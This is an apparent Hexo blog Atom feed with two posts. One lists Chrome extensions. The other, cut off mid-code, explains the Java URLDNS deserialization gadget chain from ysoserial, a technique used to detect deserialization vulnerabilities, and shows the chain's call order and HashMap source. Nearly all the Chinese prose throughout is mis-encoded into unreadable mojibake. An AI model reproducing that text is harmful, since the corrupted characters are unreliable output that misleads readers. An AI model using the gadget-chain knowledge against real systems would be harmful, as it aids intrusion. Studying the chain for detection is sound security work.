<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s1eep123ã®blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-09-01T07:18:17.993Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Arm U Chrome</title>
    <link href="http://example.com/2022/09/01/arm%20u%20chrome/"/>
    <id>http://example.com/2022/09/01/arm%20u%20chrome/</id>
    <published>2022-09-01T13:16:50.000Z</published>
    <updated>2022-09-01T07:18:17.993Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Arm-U-Chrome"><a href="#Arm-U-Chrome" class="headerlink" title="Arm U Chrome"></a>Arm U Chrome</h2><p>æœ¬æ–‡æ•´ç†äº†ä¸ªäººå­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›æœ‰ç”¨çš„chromeæ’ä»¶ã€‚</p><p>chromeåº”ç”¨å•†åº— <a href="https://chrome.google.com/webstore/category/extensions%EF%BC%8C%E9%9C%80~~%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91">https://chrome.google.com/webstore/category/extensionsï¼Œéœ€~~ç§‘å­¦ä¸Šç½‘</a>~~</p><h6 id="Tampermonkeyã€æ²¹çŒ´ã€‘"><a href="#Tampermonkeyã€æ²¹çŒ´ã€‘" class="headerlink" title="Tampermonkeyã€æ²¹çŒ´ã€‘"></a><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo">Tampermonkey</a>ã€æ²¹çŒ´ã€‘</h6><p>è¢«å„ç§æ•™è‚²ç½‘è¯¾æŠ˜ç£¨çš„å¤§å­¦ç”Ÿåº”è¯¥éƒ½çŸ¥é“è¿™ä¸ªæ’ä»¶å§ã€‚</p><p>å¯åœ¨æ’ä»¶å•†åº—å®‰è£…å„ç±»æ’ä»¶ï¼Œä»¥åŠå¯è‡ªå®šä¹‰ç¼–å†™è„šæœ¬ã€‚åˆ·ä¸ªè¯¾ç®€ç›´ä¸è¦å¤ªçˆ½ã€‚</p><p>è¿˜æœ‰å¤šç§å®ç”¨åŠŸèƒ½ç­‰å¾…æ¢ç´¢</p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901150804877.png" alt="image-20220901150804877" style="zoom:67%;" /><h6 id="google-translateã€è°·æ­Œç¿»è¯‘ã€‘"><a href="#google-translateã€è°·æ­Œç¿»è¯‘ã€‘" class="headerlink" title="google translateã€è°·æ­Œç¿»è¯‘ã€‘"></a><a href="https://chrome.google.com/webstore/detail/google-translate/aapbdbdomjkkjkaonfhkkikfgjllcleb">google translate</a>ã€è°·æ­Œç¿»è¯‘ã€‘</h6><p>é˜…è¯»è‹±æ–‡èµ„æ–™ä¸è®¤è¯†å•è¯æ€ä¹ˆåŠï¼Œè¿™æ¬¾æ’ä»¶å¯å®æ—¶å¯¹æ‰€é€‰å†…å®¹è¿›è¡Œç¿»è¯‘ï¼Œä¸”ç•Œé¢ç®€ä»‹ã€‚ç¬”è€…å¯¹å¤šæ¬¾ç¿»è¯‘æ’ä»¶ä½¿ç”¨è¿‡åï¼Œå‘ç°ä¸æ˜¯ååº”é€Ÿåº¦æ…¢ï¼ˆå¦‚æœ‰é“è¯å…¸å­—å…¸çš„å–è¯ç¿»è¯‘ï¼‰ï¼Œè¦ä¹ˆå°±æ˜¯ç¿»è¯‘ç•Œé¢è‡ƒè‚¿ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901151617157.png" alt="image-20220901151617157"></p><h6 id="Listen1ã€ç½‘é¡µå¬æ­Œã€‘"><a href="#Listen1ã€ç½‘é¡µå¬æ­Œã€‘" class="headerlink" title="Listen1ã€ç½‘é¡µå¬æ­Œã€‘"></a><a href="https://github.com/listen1/listen1_chrome_extension">Listen1</a>ã€ç½‘é¡µå¬æ­Œã€‘</h6><p>åœ¨å±‹é¡¶å”±ç€ä½ çš„æ­Œ</p><p>å®‰è£…Listen1æ’ä»¶ï¼Œå°±èƒ½æ”¶å¬å¤šä¸ªéŸ³ä¹å¹³å°çš„å…è´¹éŸ³ä¹ã€‚åŒæ—¶ï¼Œä½ è¿˜å¯ä»¥æœç´¢å¤šä¸ªå¹³å°çš„éŸ³ä¹å’Œæ­Œå•ï¼Œå¹¶ä¸”åˆ›é€ å±äºä½ è‡ªå·±çš„æ­Œå•å†…å®¹ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901151300383.png" alt="image-20220901151300383"></p><h6 id="Copyfish-ğŸŸ-Free-OCR-Softwareã€æˆªå±å–è¯æ’ä»¶ã€‘"><a href="#Copyfish-ğŸŸ-Free-OCR-Softwareã€æˆªå±å–è¯æ’ä»¶ã€‘" class="headerlink" title="Copyfish ğŸŸ Free OCR Softwareã€æˆªå±å–è¯æ’ä»¶ã€‘"></a><a href="https://chrome.google.com/webstore/detail/copyfish-%F0%9F%90%9F-free-ocr-soft/eenjdnjldapjajjofmldgmkjaienebbj">Copyfish ğŸŸ Free OCR Software</a>ã€æˆªå±å–è¯æ’ä»¶ã€‘</h6><p>ç½‘é¡µæ–‡å­—ä¸è®©å¤åˆ¶æ€ä¹ˆåŠï¼Ÿ</p><p>ä»£ç ä¸ºå›¾ç‰‡å½¢å¼ä¸èƒ½ç²˜è´´æ€ä¹ˆåŠï¼Ÿ</p><p>è¿™æ¬¾æ’ä»¶èƒ½å¤Ÿå¯¹æ‰€æˆªå–çš„å†…å®¹è¿›è¡Œ<del>é«˜æ•ˆ</del>çš„æ–‡æœ¬è¯†åˆ«ï¼Œå¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒå¤åˆ¶ä¸äº†ä»£ç å•¦ï¼ˆ<del>äº‹å®è¯†åˆ«èƒ½åŠ›è¯æ˜è¿˜æ˜¯ä¸å¤ªè¡Œï¼Œå‡‘æ´»ç”¨å§</del>ï¼‰</p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901142340816.png" alt="image-20220901142340816" style="zoom:67%;" /><h6 id="OneTabã€ä¸€é”®æ•´ç†æ ‡ç­¾é¡µï¼Œç¥å™¨å¢™æ¨ã€‘"><a href="#OneTabã€ä¸€é”®æ•´ç†æ ‡ç­¾é¡µï¼Œç¥å™¨å¢™æ¨ã€‘" class="headerlink" title="OneTabã€ä¸€é”®æ•´ç†æ ‡ç­¾é¡µï¼Œç¥å™¨å¢™æ¨ã€‘"></a><a href="https://chrome.google.com/webstore/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall">OneTab</a>ã€ä¸€é”®æ•´ç†æ ‡ç­¾é¡µï¼Œç¥å™¨å¢™æ¨ã€‘</h6><p>å†™ä»£ç é‡åˆ°è«åå…¶å¦™çš„é”™è¯¯ï¼ŒæŸ¥é˜…æ–‡æ¡£äº’ç›¸å¼•ç”¨ï¼Œå¤ç°æ¼æ´æ—¶çœ‹å„ç§æ–‡ç« ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901142907971.png" alt="image-20220901142907971"></p><p>ç›¸ä¿¡æ¯ä¸ªcoderéƒ½æœ‰è¿™æ ·çš„ç»å†ï¼Œæµè§ˆå™¨å¼€äº†ä¸€å †tabæ ‡ç­¾ä¹±å¦‚éº»å´ä¸çŸ¥æ‰€æªï¼Œæ­¤æ’ä»¶å¯ä»¥ä¸€é”®æ•´ç†tabæ ‡ç­¾ï¼Œå¹¶ä¸”å¯ä¿å­˜æ–¹ä¾¿ä¸‹æ¬¡ç›´æ¥æ‰“å¼€ã€‚</p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901142950381.png" alt="image-20220901142950381" style="zoom:67%;" /><h6 id="Quick-QRã€äºŒç»´ç ç”Ÿæˆå™¨ã€‘"><a href="#Quick-QRã€äºŒç»´ç ç”Ÿæˆå™¨ã€‘" class="headerlink" title="Quick QRã€äºŒç»´ç ç”Ÿæˆå™¨ã€‘"></a><a href="https://chrome.google.com/webstore/detail/qr-code-generator/afpbjjgbdimpioenaedcjgkaigggcdpp">Quick QR</a>ã€äºŒç»´ç ç”Ÿæˆå™¨ã€‘</h6><p>ç”µè„‘çœ‹åˆ°äº†ä¸€æ®µæƒ…è¯æƒ³åˆ†äº«ç»™å¥³ç¥æ€ä¹ˆåŠï¼Œæ–‡ä»¶ä¼ è¾“åŠ©æ‰‹ï¼Ÿå¤ªlowäº†ã€‚è¿™æ¬¾æ’ä»¶èƒ½å¤Ÿå°†ä½ æ‰€è¾“å…¥çš„æ–‡æœ¬å†…å®¹è½¬åŒ–ä¸ºQR codeï¼Œåªéœ€æ‰‹æœºä¸€æ‰«å³å¯å¤åˆ¶ç²˜è´´ã€‚å†ä¹Ÿä¸æ€•å¥³ç¥éª‚ä½ ç›´ç”·å•¦</p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901143301911.png" alt="image-20220901143301911" style="zoom:67%;" /><h6 id="çŒ«æŠ“ã€è‡ªåŠ¨å—…æ¢èµ„æº-åª’ä½“æ§è¯‰ã€‘"><a href="#çŒ«æŠ“ã€è‡ªåŠ¨å—…æ¢èµ„æº-åª’ä½“æ§è¯‰ã€‘" class="headerlink" title="çŒ«æŠ“ã€è‡ªåŠ¨å—…æ¢èµ„æº+åª’ä½“æ§è¯‰ã€‘"></a><a href="https://chrome.google.com/webstore/search/%E7%8C%AB%E6%8A%93">çŒ«æŠ“</a>ã€è‡ªåŠ¨å—…æ¢èµ„æº+åª’ä½“æ§è¯‰ã€‘</h6><p>æ‰“å¼€ä¸€ä¸ªé¡µé¢ï¼Œä¹±ä¸ƒå…«ç³Ÿçš„èµ„æºè®©ä½ æ— å¤„ä¸‹æ‰‹ã€‚è¿™æ¬¾æ’ä»¶èƒ½å¤Ÿè‡ªåŠ¨å—…æ¢å½“å‰é¡µé¢å¯ä¸‹è½½çš„èµ„æºã€‚ä¸”å¯å¯¹è§†é¢‘è¿›è¡Œå€é€Ÿè°ƒæ•´ï¼Œå¯è‡ªå·±è®¾ç½®å¿«æ·é”®ã€‚æ°é¥­æ—¶çœ‹è§†é¢‘ï¼Œåˆ·ç½‘è¯¾16å€é€Ÿå†ä¹Ÿä¸æ˜¯æ¢¦ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901143503213.png" alt="image-20220901143503213"></p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901143843767.png" alt="image-20220901143843767"></p><h6 id="FeHelperã€å‰ç«¯åŠ©æ‰‹ã€‘"><a href="#FeHelperã€å‰ç«¯åŠ©æ‰‹ã€‘" class="headerlink" title="FeHelperã€å‰ç«¯åŠ©æ‰‹ã€‘"></a><a href="https://chrome.google.com/webstore/detail/fehelper%E5%89%8D%E7%AB%AF%E5%8A%A9%E6%89%8B/pkgccpejnmalmdinmhkkfafefagiiiad">FeHelper</a>ã€å‰ç«¯åŠ©æ‰‹ã€‘</h6><p>é›†æˆäº†å„ç§åœ¨çº¿å°å·¥å…·ï¼Œå†ä¹Ÿä¸ç”¨æ‰¾å„ç§åœ¨çº¿ç½‘ç«™äº†</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901143947107.png" alt="image-20220901143947107"></p><h6 id="Enhanced-GitHubã€åŠ å¼ºçš„githubã€‘"><a href="#Enhanced-GitHubã€åŠ å¼ºçš„githubã€‘" class="headerlink" title="Enhanced GitHubã€åŠ å¼ºçš„githubã€‘"></a><a href="https://chrome.google.com/webstore/detail/enhanced-github/anlikcnbgdeidpacdbdljnabclhahhmd">Enhanced GitHub</a>ã€åŠ å¼ºçš„githubã€‘</h6><p>githubçœ‹åˆ°ä¸ªå¥½ä¸œè¥¿ï¼Œä»€ä¹ˆï¼Œç«Ÿç„¶åªèƒ½æ•´ä¸ªä»“åº“ä¸€èµ·cloneï¼Œå¥½éº»çƒ¦ã€‚è¿™æ¬¾æ’ä»¶å¯ä»¥å¯¹å•ä¸ªæ–‡ä»¶è¿›è¡Œä¸‹è½½ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901150958328.png" alt="image-20220901150958328"></p><h6 id="ublocked-originã€ç½‘ç»œè¯·æ±‚è¿‡æ»¤å·¥å…·ã€‘"><a href="#ublocked-originã€ç½‘ç»œè¯·æ±‚è¿‡æ»¤å·¥å…·ã€‘" class="headerlink" title="ublocked originã€ç½‘ç»œè¯·æ±‚è¿‡æ»¤å·¥å…·ã€‘"></a><a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm">ublocked origin</a>ã€ç½‘ç»œè¯·æ±‚è¿‡æ»¤å·¥å…·ã€‘</h6><p>ä¸€æ¬¾é«˜æ•ˆçš„ç½‘ç»œè¯·æ±‚è¿‡æ»¤å·¥å…·ï¼Œå ç”¨æä½çš„å†…å­˜å’Œ CPUã€‚ä¸€æ¬¾é«˜æ•ˆçš„è¯·æ±‚è¿‡æ»¤å·¥å…·ï¼šå ç”¨æä½çš„å†…å­˜å’ŒCPUï¼Œå’Œå…¶ä»–å¸¸è§çš„è¿‡æ»¤å·¥å…·ç›¸æ¯”ï¼Œå®ƒèƒ½å¤ŸåŠ è½½å¹¶æ‰§è¡Œä¸Šåƒæ¡è¿‡æ»¤è§„åˆ™ã€‚æ³¨æ„ä¸æ˜¯å¹¿å‘Šè¿‡æ»¤</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901144318693.png" alt="image-20220901144318693"></p><h6 id="markdown-hereã€markdown-emailã€‘"><a href="#markdown-hereã€markdown-emailã€‘" class="headerlink" title="markdown hereã€markdown emailã€‘"></a><a href="https://chrome.google.com/webstore/detail/markdown-here/elifhakcjgalahccnjkneoccemfahfoa">markdown here</a>ã€markdown emailã€‘</h6><p>å†™é‚®ä»¶è¿˜ç”¨æ‰‹åŠ¨æ’ç‰ˆï¼Ÿ</p><p>ç”¨Markdownå†™ä¸€å°æ¼‚äº®çš„ç”µå­é‚®ä»¶ã€‚<br>Markdown Hereå…è®¸ä½ åœ¨å‘é€ç”µå­é‚®ä»¶ä¹‹å‰ç”¨Markdownè¯­æ³•ç¼–è¾‘å¹¶è½¬æ¢å®ƒ(è®©å®ƒçœ‹èµ·æ¥æ¼‚äº®æäº†!)ã€‚</p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901145013920.png" alt="image-20220901145013920" style="zoom:67%;" /><h6 id="Speedtest-by-Ooklaã€ç½‘é¡µã€ç½‘ç»œæµ‹é€Ÿã€‘"><a href="#Speedtest-by-Ooklaã€ç½‘é¡µã€ç½‘ç»œæµ‹é€Ÿã€‘" class="headerlink" title="Speedtest by Ooklaã€ç½‘é¡µã€ç½‘ç»œæµ‹é€Ÿã€‘"></a><a href="https://chrome.google.com/webstore/detail/speedtest-by-ookla/pgjjikdiikihdfpoppgaidccahalehjh">Speedtest by Ookla</a>ã€ç½‘é¡µã€ç½‘ç»œæµ‹é€Ÿã€‘</h6><p>ç½‘é¡µæ‰“å¼€æ…¢ï¼Ÿå¿«æµ‹ä¸€æµ‹ä½ çš„ç½‘é€Ÿæ˜¯æ‹–æ‹‰æœºè¿˜æ˜¯é£æœº</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901151039400.png" alt="image-20220901151039400"></p><h6 id="ç±»ä¼¼çš„ç½‘ç«™ã€å‘ç°ç±»ä¼¼ç½‘ç«™ã€‘"><a href="#ç±»ä¼¼çš„ç½‘ç«™ã€å‘ç°ç±»ä¼¼ç½‘ç«™ã€‘" class="headerlink" title="ç±»ä¼¼çš„ç½‘ç«™ã€å‘ç°ç±»ä¼¼ç½‘ç«™ã€‘"></a><a href="https://chrome.google.com/webstore/detail/similar-sites-discover-re/necpbmbhhdiplmfhmjicabdeighkndkn">ç±»ä¼¼çš„ç½‘ç«™</a>ã€å‘ç°ç±»ä¼¼ç½‘ç«™ã€‘</h6><p>å¿«é€Ÿæ¢æµ‹å’Œæœ¬ç½‘ç«™ç›¸ä¼¼çš„ç½‘ç«™ï¼Œå®ç°èµ„æºæ¨ªå‘ã€‚ï¼ˆ<del>ä¸è¦å»porxhubå“¦</del>ï¼‰</p><p>æ‹¿gayhubä¸¾ä¾‹ï¼Œèƒ½å¤Ÿæ¢æµ‹åˆ°ç›¸åŒç±»å‹çš„ç½‘ç«™</p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901145121516.png" alt="image-20220901145121516" style="zoom:50%;" /><h6 id="äº¬ä¸œæŠ¥ä»·åŠ©æ‰‹ã€å®æ—¶ç›‘æµ‹ä»·æ ¼ã€‘"><a href="#äº¬ä¸œæŠ¥ä»·åŠ©æ‰‹ã€å®æ—¶ç›‘æµ‹ä»·æ ¼ã€‘" class="headerlink" title="äº¬ä¸œæŠ¥ä»·åŠ©æ‰‹ã€å®æ—¶ç›‘æµ‹ä»·æ ¼ã€‘"></a><a href="https://chrome.google.com/webstore/detail/%E4%BA%AC%E4%BB%B7%E4%BF%9D-%E4%BA%AC%E4%B8%9C%E4%BB%B7%E4%BF%9D%E5%8A%A9%E6%89%8B/gfgkebiommjpiaomalcbfefimhhanlfd">äº¬ä¸œæŠ¥ä»·åŠ©æ‰‹</a>ã€å®æ—¶ç›‘æµ‹ä»·æ ¼ã€‘</h6><p>æ€•è¢«å¼ºå­è–…ç¾Šæ¯›ï¼Ÿä¸å¯èƒ½çš„ï¼Œæ­¤æ¬¾æ’ä»¶å¯å®æ—¶ç›‘æ§äº¬ä¸œä»·æ ¼ï¼Œä¸”å¯è‡ªåŠ¨ç”³è¯·ä»·ä¿æœåŠ¡ã€‚çœäº†ä¸€å—å°±æ˜¯èµšäº†ä¸€å—ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901145458254.png" alt="image-20220901145458254"></p><h6 id="Wappalyzer-Technology-profilerã€æ¢æµ‹ç½‘é¡µæ¡†æ¶ã€‘"><a href="#Wappalyzer-Technology-profilerã€æ¢æµ‹ç½‘é¡µæ¡†æ¶ã€‘" class="headerlink" title="Wappalyzer - Technology profilerã€æ¢æµ‹ç½‘é¡µæ¡†æ¶ã€‘"></a><a href="https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg">Wappalyzer - Technology profiler</a>ã€æ¢æµ‹ç½‘é¡µæ¡†æ¶ã€‘</h6><p>å¯è‡ªåŠ¨æ¢æµ‹ç½‘é¡µæ¡†æ¶æ„æˆã€‚<del>æ¸—é€æµ‹è¯•æ—¶ä¹Ÿè®¸æœ‰ç”¨</del></p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901145648866.png" alt="image-20220901145648866" style="zoom:67%;" /><h6 id="WhatRunsã€åŒä¸Šã€‘"><a href="#WhatRunsã€åŒä¸Šã€‘" class="headerlink" title="WhatRunsã€åŒä¸Šã€‘"></a><a href="https://chrome.google.com/webstore/detail/whatruns/cmkdbmfndkfgebldhnkbfhlneefdaaip">WhatRuns</a>ã€åŒä¸Šã€‘</h6><p>åŒä¸Šï¼Œä½†è¿˜æ˜¯éœ€è¦è‡ªå·±ç‚¹ä¸€ä¸‹æ‰å¯ä»¥ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901145756794.png" alt="image-20220901145756794"></p><h6 id="YouTubeâ„¢-åŒå­—å¹•ã€åŒè¯­å­—å¹•ï¼Œå­—å¹•ä¸‹è½½ï¼Œå­—å¹•é…éŸ³ã€‘"><a href="#YouTubeâ„¢-åŒå­—å¹•ã€åŒè¯­å­—å¹•ï¼Œå­—å¹•ä¸‹è½½ï¼Œå­—å¹•é…éŸ³ã€‘" class="headerlink" title="YouTubeâ„¢ åŒå­—å¹•ã€åŒè¯­å­—å¹•ï¼Œå­—å¹•ä¸‹è½½ï¼Œå­—å¹•é…éŸ³ã€‘"></a><a href="https://chrome.google.com/webstore/detail/youtube-dual-subtitles/hkbdddpiemdeibjoknnofflfgbgnebcm">YouTubeâ„¢ åŒå­—å¹•</a>ã€åŒè¯­å­—å¹•ï¼Œå­—å¹•ä¸‹è½½ï¼Œå­—å¹•é…éŸ³ã€‘</h6><p>è‹±è¯­çœ‹ä¸æ‡‚æ€ä¹ˆåŠï¼Ÿ<del>ä¸çœ‹äº†</del>ï¼Œyoutubeè‡ªå¸¦å­—å¹•åªå¯å®ç°è‹±æ–‡&#x2F;ä¸­æ–‡,æ­¤æ’ä»¶å¯å®ç°åŒå­—å¹•ï¼Œçœ‹ç‰‡çš„æ—¶å€™å­¦å­¦è‹±è¯­ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901145943641.png" alt="image-20220901145943641"></p><h6 id="Sourcegraphã€githubæœç´¢ç¥å™¨ã€‘"><a href="#Sourcegraphã€githubæœç´¢ç¥å™¨ã€‘" class="headerlink" title="Sourcegraphã€githubæœç´¢ç¥å™¨ã€‘"></a><a href="https://chrome.google.com/webstore/detail/sourcegraph/dgjhfomjieaadpoljlnidmbgkdffpack">Sourcegraph</a>ã€githubæœç´¢ç¥å™¨ã€‘</h6><p>å¯å®ç°å…³é”®å­—æœç´¢ï¼Œç”Ÿæˆä»£ç ç»“æ„å›¾ã€‚æ›´å¤šåŠŸèƒ½æ­£åœ¨æ¢ç´¢ã€‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901150236067.png" alt="image-20220901150236067"></p><h6 id="GitHub-Web-IDEã€webç«¯vscodeã€‘"><a href="#GitHub-Web-IDEã€webç«¯vscodeã€‘" class="headerlink" title="GitHub-Web-IDEã€webç«¯vscodeã€‘"></a><a href="https://chrome.google.com/webstore/detail/github-web-ide/adjiklnjodbiaioggfpbpkhbfcnhgkfe">GitHub-Web-IDE</a>ã€webç«¯vscodeã€‘</h6><p>å¦‚ä½•ä¼˜é›…çš„æŸ¥çœ‹githubä»“åº“</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901150411195.png" alt="image-20220901150411195"></p><h6 id="æ‰©å±•ç®¡ç†å™¨ã€ç®¡ç†æ’ä»¶ã€‘"><a href="#æ‰©å±•ç®¡ç†å™¨ã€ç®¡ç†æ’ä»¶ã€‘" class="headerlink" title="æ‰©å±•ç®¡ç†å™¨ã€ç®¡ç†æ’ä»¶ã€‘"></a><a href="https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco">æ‰©å±•ç®¡ç†å™¨</a>ã€ç®¡ç†æ’ä»¶ã€‘</h6><p>å®‰è£…ä¸Šè¿°æ’ä»¶åï¼Œä½ çš„å›ºå®šæ æ˜¯ä¸æ˜¯è¿™æ ·</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901150552479.png" alt="image-20220901150552479"></p><p>è¿™æ¬¾æ’ä»¶å¯æ”¶èµ·å›ºå®šæ ã€‚ä¼˜é›…ã€‚</p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901150631177.png" alt="image-20220901150631177" style="zoom:50%;" /><h4 id="æ›´å¤šå†…å®¹ç­‰å¾…æ¢ç´¢"><a href="#æ›´å¤šå†…å®¹ç­‰å¾…æ¢ç´¢" class="headerlink" title="æ›´å¤šå†…å®¹ç­‰å¾…æ¢ç´¢"></a>æ›´å¤šå†…å®¹ç­‰å¾…æ¢ç´¢</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Arm-U-Chrome&quot;&gt;&lt;a href=&quot;#Arm-U-Chrome&quot; class=&quot;headerlink&quot; title=&quot;Arm U Chrome&quot;&gt;&lt;/a&gt;Arm U Chrome&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡æ•´ç†äº†ä¸ªäººå­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›æœ‰ç”¨çš„chromeæ’ä»¶ã€‚&lt;</summary>
      
    
    
    
    <category term="é»‘ç§‘æŠ€" scheme="http://example.com/categories/%E9%BB%91%E7%A7%91%E6%8A%80/"/>
    
    
    <category term="é»‘ç§‘æŠ€" scheme="http://example.com/tags/%E9%BB%91%E7%A7%91%E6%8A%80/"/>
    
  </entry>
  
  <entry>
    <title>URLDNSé“¾</title>
    <link href="http://example.com/2022/08/11/urldns/"/>
    <id>http://example.com/2022/08/11/urldns/</id>
    <published>2022-08-11T13:16:50.000Z</published>
    <updated>2022-09-01T00:55:00.670Z</updated>
    
    <content type="html"><![CDATA[<h2 id="URLDNSé“¾"><a href="#URLDNSé“¾" class="headerlink" title="URLDNSé“¾"></a>URLDNSé“¾</h2><ol><li><p>æ¦‚è¿°</p><p>URLDNS å°±æ˜¯ysoserialä¸­ä¸€ä¸ªï§ç”¨é“¾çš„åå­—ï¼Œä½†å‡†ç¡®æ¥è¯´ï¼Œè¿™ä¸ªå…¶å®ï¥§èƒ½ç§°ä½œâ€œï§ç”¨é“¾â€ã€‚å› ä¸ºå…¶å‚æ•°ä¸ï¥§æ˜¯ä¸€ä¸ªå¯ä»¥â€œï§ç”¨â€çš„å‘½ä»¤ï¼Œè€Œä»…ä¸ºä¸€ä¸ªURLï¼Œå…¶èƒ½è§¦å‘çš„ç»“æœä¹Ÿï¥§æ˜¯å‘½ä»¤æ‰§ï¨ˆï¼Œè€Œæ˜¯ä¸€æ¬¡DNSè¯·æ±‚ã€‚</p><p>è™½ç„¶è¿™ä¸ªâ€œï§ç”¨é“¾â€å®é™…ä¸Šæ˜¯ï¥§èƒ½â€œï§ç”¨â€çš„ï¼Œä½†å› ä¸ºå…¶å¦‚ä¸‹çš„ä¼˜ç‚¹ï¼Œéå¸¸é€‚åˆæˆ‘ä»¬åœ¨æ£€æµ‹ååºåˆ—åŒ–ï¥ï¨…æ—¶ä½¿ç”¨ï¼š</p><ul><li>ä½¿ç”¨Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ä¾èµ–</li><li>åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºï¦œåŒ–ï¥ï¨…</li></ul></li><li><p>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure></li><li><p>HashMapåº•å±‚åŸç†</p><ul><li><p>HashMapæ˜¯Mapçš„ä¸€ä¸ªå®ç°ç±»ï¼Œä»¥æ•°ç»„+(é“¾è¡¨æˆ–çº¢é»‘æ ‘)å®ç°ã€‚å®ƒæ˜¯ä»¥é”®å€¼å¯¹å­˜å‚¨æ•°æ®çš„ï¼ŒKey-Valueéƒ½æ˜¯Map.Entryä¸­çš„å±æ€§</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828132806229.png" alt="image-20220828132806229">  </p></li><li><p>åœ¨å®ä¾‹åŒ–ä»¥åï¼Œåº•å±‚åˆ›å»ºäº†é•¿åº¦æ˜¯16çš„ä¸€ç»´æ•°ç»„<code>Entry[] table</code>,å…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹ç”¨Nodeè¡¨ç¤º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Node(<span class="type">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="built_in">this</span>.hash = hash;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>å½“putä¸€ä¸ªé”®å€¼å¯¹æ—¶ï¼Œé¦–å…ˆå¯¹keyè¿›è¡Œhashï¼Œå…¶ä¸­hashä¸­åˆè°ƒç”¨hashcodeæ–¹æ³•ï¼Œä¹‹åæ·»åŠ tabæ•°ç»„ä¸­æ·»åŠ node,æºç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 